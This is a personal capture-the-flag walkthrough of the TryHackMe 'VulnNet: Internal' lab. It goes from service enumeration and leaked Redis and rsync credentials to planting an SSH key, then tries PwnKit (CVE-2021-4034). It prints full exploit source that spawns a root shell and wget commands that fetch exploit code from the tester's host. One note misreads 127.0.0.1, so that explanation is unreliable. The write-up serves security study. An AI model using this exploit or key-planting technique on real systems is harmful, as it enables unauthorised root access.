@@ -1,0 +1,691 @@
+VULNNET: INTERNAL.
+
+
+
+
+[>>> 1. ENUMERATION: PORTS/SERVICES]
+[ACTION: nmap quick all ports scan]
+nmap -sS -T4 -sV -p- 10.10.246.100
+[OUTPUT]
+PORT      STATE    SERVICE     VERSION
+22/tcp    open     ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+111/tcp   open     rpcbind     2-4 (RPC #100000)
+139/tcp   open     netbios-ssn Samba smbd 4
+445/tcp   open     netbios-ssn Samba smbd 4
+873/tcp   open     rsync       (protocol version 31)
+2049/tcp  open     nfs         3-4 (RPC #100003)
+6379/tcp  open     redis       Redis key-value store
+9090/tcp  filtered zeus-admin
+33075/tcp open     nlockmgr    1-4 (RPC #100021)
+36005/tcp open     mountd      1-3 (RPC #100005)
+39307/tcp open     mountd      1-3 (RPC #100005)
+48655/tcp open     mountd      1-3 (RPC #100005)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+
+[>>> 2. RECON: samba]
+[ACTION: list shares]
+smbclient -L 10.10.246.100 -N
+[OUTPUT]
+Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	shares          Disk      VulnNet Business Shares
+	IPC$            IPC       IPC Service (ip-10-10-246-100 server (Samba, Ubuntu))
+
+
+[ACTION: connect to shares share]
+smbclient //10.10.246.100/shares -N
+
+
+[ACTION: list content current directory]
+dir
+[OUTPUT]
+  .                                   D        0  Tue Feb  2 10:20:09 2021
+  ..                                  D        0  Tue Feb  2 10:28:11 2021
+  temp                                D        0  Sat Feb  6 12:45:10 2021
+  data                                D        0  Tue Feb  2 10:27:33 2021
+
+
+[ACTION: list temp content]
+cd temp
+dir
+[OUTPUT]
+  .                                   D        0  Sat Feb  6 12:45:10 2021
+  ..                                  D        0  Tue Feb  2 10:20:09 2021
+  services.txt                        N       38  Sat Feb  6 12:45:09 2021
+
+
+[ACTION: download services]
+prompt off
+mget * a
+
+
+[ACTION: display services flag]
+cat services.txt
+[OUTPUT]
+THM{0a09d51e488f5fa105d8d866a497440a}
+
+
+[ACTION: list data content]
+cd /data
+dir
+[OUTPUT]
+  .                                   D        0  Tue Feb  2 10:27:33 2021
+  ..                                  D        0  Tue Feb  2 10:20:09 2021
+  data.txt                            N       48  Tue Feb  2 10:21:18 2021
+  business-req.txt                    N      190  Tue Feb  2 10:27:33 2021
+
+
+[ACTION: download all files]
+mget *
+
+
+[ACTION: display data]
+cat data.txt
+[OUTPUT]
+Purge regularly data that is not needed anymore
+
+
+[ACTION: display business-req]
+cat business-req.txt
+[OUTPUT]
+We just wanted to remind you that we’re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
+If you have any questions, please text or phone us.
+
+
+
+
+[>>> 3. RECON: rpc]
+[ACTION: display rpc services]
+   program vers proto   port  service
+    100000    4   tcp    111  portmapper
+    100000    3   tcp    111  portmapper
+    100000    2   tcp    111  portmapper
+    100000    4   udp    111  portmapper
+    100000    3   udp    111  portmapper
+    100000    2   udp    111  portmapper
+    100005    1   udp  59626  mountd
+    100005    1   tcp  48655  mountd
+    100005    2   udp  39452  mountd
+    100005    2   tcp  36005  mountd
+    100005    3   udp  51576  mountd
+    100005    3   tcp  39307  mountd
+    100003    3   tcp   2049  nfs
+    100003    4   tcp   2049  nfs
+    100227    3   tcp   2049  nfs_acl
+    100003    3   udp   2049  nfs
+    100227    3   udp   2049  nfs_acl
+    100021    1   udp  41724  nlockmgr
+    100021    3   udp  41724  nlockmgr
+    100021    4   udp  41724  nlockmgr
+    100021    1   tcp  33075  nlockmgr
+    100021    3   tcp  33075  nlockmgr
+    100021    4   tcp  33075  nlockmgr
+
+
+
+
+[>>> 4. RECON: rsync]
+[ACTION: display available modules]
+rsync rsync://10.10.246.100/
+[OUTPUT]
+files          Necessary home interaction
+
+
+[ACTION: list files inside files module]
+rsync rsync://10.10.246.100/files/
+[OUTPUT]
+Password: 
+[NOTE]
+Looks like we will skip this for now.
+
+
+
+
+[>>> 5. RECON: nfs]
+[ACTION: display nfs exports]
+showmount -e 10.10.246.100
+[OUTPUT]
+Export list for 10.10.246.100:
+/opt/conf *
+[NOTE]
+* indicates export destinations have no ip restrictions.
+
+
+[ACTION: mount conf]
+sudo mount -t nfs 10.10.246.100:/opt/conf /mnt
+
+
+[ACTION: list mnt content]
+cd /mnt; ls
+
+
+[ACTION: list hp content]
+ls hp
+[OUTPUT]
+hplip.conf
+
+
+[ACTION: display hplip]
+cat hp/hplip.conf
+[OUTPUT]
+# hplip.conf.  Generated from hplip.conf.in by configure.
+
+[hplip]
+version=3.17.10
+
+[dirs]
+home=/usr/share/hplip
+run=/var/run
+ppd=/usr/share/ppd/hplip/HP
+ppdbase=/usr/share/ppd/hplip
+doc=/usr/share/doc/hplip
+html=/usr/share/doc/hplip-doc
+icon=no
+cupsbackend=/usr/lib/cups/backend
+cupsfilter=/usr/lib/cups/filter
+drv=/usr/share/cups/drv
+bin=/usr/bin
+apparmor=/etc/apparmor.d
+# Following values are determined at configure time and cannot be changed.
+[configure]
+network-build=yes
+libusb01-build=no
+pp-build=yes
+gui-build=yes
+scanner-build=yes
+fax-build=yes
+dbus-build=yes
+cups11-build=no
+doc-build=yes
+shadow-build=no
+hpijs-install=yes
+foomatic-drv-install=yes
+foomatic-ppd-install=yes
+foomatic-rip-hplip-install=no
+hpcups-install=yes
+cups-drv-install=yes
+cups-ppd-install=no
+internal-tag=3.17.10
+restricted-build=no
+ui-toolkit=qt5
+qt3=no
+qt4=no
+qt5=yes
+policy-kit=yes
+lite-build=no
+udev_sysfs_rules=no
+hpcups-only-build=no
+hpijs-only-build=no
+apparmor_build=no
+[NOTE]
+Hplip provides printer drivers for hp devices.
+Rest of the folders:
+1. init: conf files.
+2. profile.d: shell settings.
+3. redis: redis conf file.
+4. Same with vim and wildmidi.
+Nothing interesting.
+
+
+[ACTION: check if nfs mount is writable]
+touch /mnt/test
+[OUTPUT]
+touch: cannot touch '/mnt/test': Read-only file system
+
+
+
+
+[>>> 6. RECON: redis]
+[ACTION: anon connection]
+redis-cli -h 10.10.246.100
+
+
+[ACTION: list all keys]
+KEYS *
+[OUTPUT]
+(error) NOAUTH Authentication required.
+[NOTE]
+Looks like I've reached a dead end.
+
+
+[NOTE]
+Rereading the writeup, I realize I skipped the redis.conf file...
+Researching I figured out that file contains the password, set in field requirepass.
+[ACTION: search for redis password]
+grep -i 'requirepass' /mnt/redis/redis.conf
+[OUTPUT]
+# If the master is password protected (using the "requirepass" configuration
+requirepass "B65Hx562F@ggAZ@F"
+# requirepass foobared
+
+
+[ACTION: connect to redis with password]
+redis-cli -h 10.10.246.100 -p 6379 -a B65Hx562F@ggAZ@F
+
+
+[ACTION: verify proper login]
+PING
+[OUTPUT]
+PONG
+
+
+[ACTION: list all keys]
+KEYS *
+[OUTPUT]
+1) "authlist"
+2) "int"
+3) "tmp"
+4) "marketlist"
+5) "internal flag"
+
+
+[ACTION: check internal flag key type]
+TYPE "internal flag"
+[OUTPUT]
+string
+
+
+[ACTION: display internal flag]
+GET "internal flag"
+[OUTPUT]
+"THM{ff8e518addbbddb74531a724236a8221}"
+
+
+[ACTION: check authlist key type]
+TYPE authlist
+[OUTPUT]
+list
+
+
+[ACTION: display authlist]
+LRANGE authlist 0 -1
+[OUTPUT]
+1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
+2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
+3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
+4) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
+
+
+[ACTION: check int keytype]
+TYPE int
+[OUTPUT]
+string
+
+
+[ACTION: display int]
+GET int
+[OUTPUT]
+"10 20 30 40 50"
+
+
+[ACTION: check tmp key type]
+TYPE tmp
+[OUTPUT]
+string
+
+
+[ACTION: display tmp]
+GET tmp
+[OUTPUT]
+"temp dir..."
+
+
+[ACTION: check marketlist key type]
+TYPE marketlist
+[OUTPUT]
+list
+
+
+[ACTION: display marketlist]
+LRANGE marketlist 0 -1
+[OUTPUT]
+1) "Machine Learning"
+2) "Penetration Testing"
+3) "Programming"
+4) "Data Analysis"
+5) "Analytics"
+6) "Marketing"
+7) "Media Streaming"
+
+
+[NOTE]
+Authlist repeats same base64 string 4 times.
+[ACTION: decode string]
+echo "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==" | base64 -d
+[OUTPUT]
+Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
+[NOTE]
+12.0.0.1 just means our machine ip.
+Which means we have found the password we were missing beforehand.
+
+
+
+
+[>>> 7. RECON: rsyinc (with password)]
+[NOTE]
+We already know the module available is files.
+Password: Hcg3HP67@TW@Bc72v
+[ACTION: connect to files]
+rsync rsync://rsync-connect@10.10.246.100/files/
+[OUTPUT]
+drwxr-xr-x          4,096 2025/08/07 19:52:17 .
+drwxr-xr-x          4,096 2025/06/28 18:16:36 ssm-user
+drwxr-xr-x          4,096 2021/02/06 13:49:29 sys-internal
+drwxr-xr-x          4,096 2025/08/07 19:52:17 ubuntu
+[NOTE]
+For easier exploration (rsync commands are too long), I'll mount rsync.
+
+
+[ACTION: mount rsyinc content]
+mkdir vulnnet_rsync
+rsync -avz --progress rsync://rsync-connect@10.10.246.100/files/ ~/vulnnet_rsync/
+
+
+[ACTION: verify proper download]
+ls -la 
+[OUTPUT]
+drwxr-xr-x  5 user0 pab  4096 Aug  7 19:52 .
+drwx------ 47 user0 pab 12288 Aug  7 20:50 ..
+drwxr-xr-x  2 user0 pab  4096 Jun 28 18:16 ssm-user
+drwxr-xr-x 18 user0 pab  4096 Feb  6  2021 sys-internal
+drwxr-xr-x  3 user0 pab  4096 Aug  7 19:52 ubuntu
+
+
+[ACTION: list ssm-user content]
+ls -la ssm-user
+[OUTPUT]
+drwxr-xr-x 2 user0 pab 4096 Jun 28 18:16 .
+drwxr-xr-x 5 user0 pab 4096 Aug  7 19:52 ..
+-rw-r--r-- 1 user0 pab  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 user0 pab 3771 Apr  4  2018 .bashrc
+-rw-r--r-- 1 user0 pab  807 Apr  4  2018 .profile
+
+
+[ACTION: list sys-internal content]
+ls -la sys-internal
+[OUTPUT]
+drwxr-xr-x 18 user0 pab 4096 Feb  6  2021 .
+drwxr-xr-x  5 user0 pab 4096 Aug  7 19:52 ..
+-rw-------  1 user0 pab   61 Feb  6  2021 .Xauthority
+lrwxrwxrwx  1 user0 pab    9 Feb  1  2021 .bash_history -> /dev/null
+-rw-r--r--  1 user0 pab  220 Feb  1  2021 .bash_logout
+-rw-r--r--  1 user0 pab 3771 Feb  1  2021 .bashrc
+drwxrwxr-x  8 user0 pab 4096 Feb  2  2021 .cache
+drwxrwxr-x 14 user0 pab 4096 Feb  1  2021 .config
+drwx------  3 user0 pab 4096 Feb  1  2021 .dbus
+-rw-r--r--  1 user0 pab   26 Feb  1  2021 .dmrc
+drwx------  3 user0 pab 4096 Feb  1  2021 .gnupg
+drwxrwxr-x  3 user0 pab 4096 Feb  1  2021 .local
+drwx------  5 user0 pab 4096 Feb  1  2021 .mozilla
+-rw-r--r--  1 user0 pab  807 Feb  1  2021 .profile
+lrwxrwxrwx  1 user0 pab    9 Feb  2  2021 .rediscli_history -> /dev/null
+drwxrwxr-x  2 user0 pab 4096 Feb  6  2021 .ssh
+-rw-r--r--  1 user0 pab    0 Feb  1  2021 .sudo_as_admin_successful
+drwx------  4 user0 pab 4096 Feb  2  2021 .thumbnails
+-rw-r--r--  1 user0 pab   14 Feb 12  2018 .xscreensaver
+-rw-------  1 user0 pab 2546 Feb  6  2021 .xsession-errors
+-rw-------  1 user0 pab 2546 Feb  6  2021 .xsession-errors.old
+drwx------  2 user0 pab 4096 Feb  1  2021 Desktop
+drwxr-xr-x  2 user0 pab 4096 Feb  1  2021 Documents
+drwxr-xr-x  2 user0 pab 4096 Feb  1  2021 Downloads
+drwxr-xr-x  2 user0 pab 4096 Feb  1  2021 Music
+drwxr-xr-x  2 user0 pab 4096 Feb  1  2021 Pictures
+drwxr-xr-x  2 user0 pab 4096 Feb  1  2021 Public
+drwxr-xr-x  2 user0 pab 4096 Feb  1  2021 Templates
+drwxr-xr-x  2 user0 pab 4096 Feb  1  2021 Videos
+-rw-------  1 user0 pab   38 Feb  6  2021 user.txt
+
+
+[ACTION: display user]
+cat sys-internal/user.txt
+[OUTPUT]
+THM{da7c20696831f253e0afaca8b83c07ab}
+
+
+[ACTION: display ssh content]
+ls -la sys-internal/.ssh/
+[OUTPUT]
+drwxrwxr-x  2 user0 pab 4096 Feb  6  2021 .
+drwxr-xr-x 18 user0 pab 4096 Feb  6  2021 ..
+
+
+[ACTION: display gnupg content]
+ls -la sys-internal/.gnupg
+[OUTPUT]
+drwx------  3 user0 pab 4096 Feb  1  2021 .
+drwxr-xr-x 18 user0 pab 4096 Feb  6  2021 ..
+drwx------  2 user0 pab 4096 Feb  1  2021 private-keys-v1.d
+
+
+
+[>>> 8. BRUTEFORCE]
+[NOTE]
+We didn't find any keys, but did find a user: sys-internal
+[ACTION: bruteforce ssh login]
+hydra -l sys-internal -P ~/thm/rockyou.txt 10.10.246.100 ssh
+[NOTE]
+Hydra is taking too long. 
+Probably wrong path.
+
+
+
+
+[>>> 9. GAIN USER ACCESS: generate ssh key pair]
+[ACTION: generate ssh key pair (local)]
+ssh-keygen -t rsa -b 4096 -f vulnkey -N ""
+
+[ACTION: add keys to sys-internal]
+echo "$(cat vulnkey.pub)" >> ~/vulnnet_rsync/sys-internal/.ssh/authorized_keys
+
+
+[ACTION: syinc modified autorized_keys directory to machine]
+rsync -avz ~/vulnnet_rsync/sys-internal/.ssh/authorized_keys rsync-connect@10.10.246.100::files/sys-internal/.ssh/authorized_keys
+
+
+[ACTION: ssh as sys-internal]
+ssh -i vulnkey sys-internal@10.10.246.100
+
+
+
+
+[>>> PRIVESC: TO ROOT]
+[ACTION: list suid binaries]
+find / -perm -4000 -type f 2>/dev/null
+[OUTPUT]
+/bin/mount
+/bin/fusermount
+/bin/su
+/bin/umount
+
+/usr/local/bin/sudo
+/usr/bin/newgrp
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/pkexec
+/usr/sbin/pppd
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/snapd/snap-confine
+/sbin/mount.nfs
+
+
+[ACTION: display pkexec version]
+pkexec --version
+[OUTPUT]
+pkexec version 0.105
+
+
+[NOTE]
+We can try cve-2021-4034, PolicyKit-1 0.105-31 - Privilege Escalation: https://www.exploit-db.com/exploits/50689
+[ACTION: verify gcc installed]
+which gcc
+[OUTPUT]
+/usr/bin/gcc
+
+
+[ACTION: create evil-so.c]
+cat << 'EOF' > evil-so.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void gconv() {}
+
+void gconv_init() {
+    setuid(0);
+    setgid(0);
+    setgroups(0);
+    execve("/bin/sh", NULL, NULL);
+}
+EOF
+
+
+[ACTION: create exploit.c]
+cat << 'EOF' > exploit.c
+#include <stdio.h>
+#include <stdlib.h>
+
+#define BIN "/usr/bin/pkexec"
+#define DIR "evildir"
+#define EVILSO "evil"
+
+int main()
+{
+    char *envp[] = {
+        DIR,
+        "PATH=GCONV_PATH=.",
+        "SHELL=ryaagard",
+        "CHARSET=ryaagard",
+        NULL
+    };
+    char *argv[] = { NULL };
+
+    system("mkdir GCONV_PATH=.");
+    system("touch GCONV_PATH=./" DIR " && chmod 777 GCONV_PATH=./" DIR);
+    system("mkdir " DIR);
+    system("echo 'module\tINTERNAL\t\t\tryaagard//\t\t\t" EVILSO "\t\t\t2' > " DIR "/gconv-modules");
+    system("cp " EVILSO ".so " DIR);
+
+    execve(BIN, argv, envp);
+
+    return 0;
+}
+EOF
+
+
+[ACTION: compile .so]
+gcc -shared -fPIC -o evil.so evil-so.c
+
+
+[ACTION: compile and run exploit]
+gcc -o exploit exploit.c
+./exploit
+[OUTPUT]
+GLib: Cannot convert message: Could not open converter from “UTF-8” to “ryaagard”
+
+
+[ACTION: evil.so]
+cat << 'EOF' > evil-so.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <grp.h> // Fix setgroups warning
+
+void gconv() {}
+
+void gconv_init() {
+    setuid(0);
+    setgid(0);
+    setgroups(0, NULL);
+
+    char *args[] = { "/bin/sh", NULL };
+    execve("/bin/sh", args, NULL);
+}
+EOF
+
+
+[ACTION: recompile]
+gcc -shared -fPIC -o evil.so evil-so.c
+
+
+[ACTION: new exploit]
+cat << 'EOF' > exploit.c
+#include <stdio.h>
+#include <stdlib.h>
+
+#define BIN "/usr/bin/pkexec"
+#define DIR "evildir"
+#define EVILSO "evil"
+
+int main()
+{
+    char *envp[] = {
+        "evildir",                           // Fake argv[0]
+        "PATH=GCONV_PATH=.",                 // GCONV_PATH=.
+        "SHELL=whatever",                    // Arbitrary
+        "CHARSET=ryaagard",                  // Charset triggers the load
+        NULL
+    };
+
+    system("rm -rf GCONV_PATH=. evildir");  // Clean up from previous runs
+    system("mkdir -p GCONV_PATH=.");
+    system("mkdir -p evildir");
+    system("echo 'module INTERNAL ryaagard// evil 2' > evildir/gconv-modules");
+    system("cp evil.so evildir/evil.so");
+
+    execve(BIN, NULL, envp);
+
+    return 0;
+}
+EOF
+
+
+[NOTE]
+Since I am having weird issues, ill try other files: https://github.com/berdav/CVE-2021-4034/blob/main/cve-2021-4034.c.
+Saved as cve-2021-4034.c
+[ACTION: start python server]
+python3 -m http.server 80
+
+
+[ACTION: download to machine]
+curl http://10.23.25.109/cve-2021-4034.c -o cve-2021-4034
+[OUTPUT]
+Command 'curl' not found, but can be installed with:
+
+
+[ACTION: check if wget installed]
+which wget
+[OUTPUT]
+/usr/bin/wget
+
+
+[ACTION: download via wget]
+wget http://10.23.25.109/cve-2021-4034.c -O cve-2021-4034.c
+
+
+[NOTE]
+Saved Makefile as Makefile
+[ACTION: download Makefile]
+wget http://10.23.25.109/Makefile -O Makefile
+
+
+[ACTION: download pwnkit.c]
+wget http://10.23.25.109/pwnkit.c -O pwnkit.c
+
+
+[ACTION: exploit]
+make
+./cve-2021-4034
+[OUTPUT]
+GLib: Cannot convert message: Could not open converter from “UTF-8” to “PWNKIT”
+
